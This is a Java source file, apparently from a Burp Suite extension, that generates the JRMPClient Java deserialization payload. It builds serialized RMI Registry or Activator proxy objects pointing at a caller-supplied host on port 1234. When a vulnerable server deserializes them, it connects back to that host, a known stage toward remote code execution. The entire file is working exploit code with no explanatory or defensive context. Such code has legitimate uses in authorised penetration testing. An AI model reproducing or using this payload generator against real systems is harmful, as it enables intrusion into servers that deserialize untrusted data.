package burp;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import sun.rmi.transport.tcp.TCPEndpoint;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;

public class JRMPClient {

    private static Registry getObject(String host) {
        int port = 1234;

        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{Registry.class}, obj);
        return proxy;
    }

    private static Activator getActivator(String host) {
        int port = 1234;

        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{Activator.class}, obj);
        return proxy;
    }

    public static byte[] getPayloadBytes(String host, String type) throws Exception {
        final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
        if (type.equalsIgnoreCase("activator")) {
            objOut.writeObject(getActivator(host));
        } else {
            objOut.writeObject(getObject(host));
        }
        objOut.flush();
        objOut.close();
        return byteOut.toByteArray();
    }
}
